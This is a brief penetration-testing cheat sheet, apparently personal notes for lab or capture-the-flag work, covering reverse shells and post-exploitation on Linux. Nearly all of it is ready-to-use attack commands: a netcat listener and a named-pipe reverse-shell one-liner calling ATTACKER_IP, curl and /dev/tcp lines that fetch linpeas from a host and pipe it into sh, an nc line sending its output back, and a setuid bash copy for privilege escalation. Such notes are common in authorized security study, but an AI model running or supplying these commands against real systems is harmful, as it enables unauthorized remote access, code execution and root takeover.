## Reverse Shell
Initiates from the target system. Help avoid detection from network firewalls and other security appliances.

- Setting up a Netcat Listener (attacker):
  `nc -lvnp 443`
- pipe reverse shell payload:
  ``rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f``

## When You're In
- `whoami` - check current user
- `ls -a` - print directories
- `sudo -l` - check sudo privilege
- transfer files using scp
  `scp file.txt user@host:/path/to/dest`
- transfer files by python3's http.server
```
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
- linpeas for privilege escalation
- pspy for snooping linux processes
- if there's a process that runs as the root that we can edit, try:
```bash
cd /home/user
cp /bin/bash .
chmod +xs bash
```
- s is special permission known as the setuid/setgid bit. When set on an executable file, it allows the file to be executed with the privileges of its owner or group, respectively.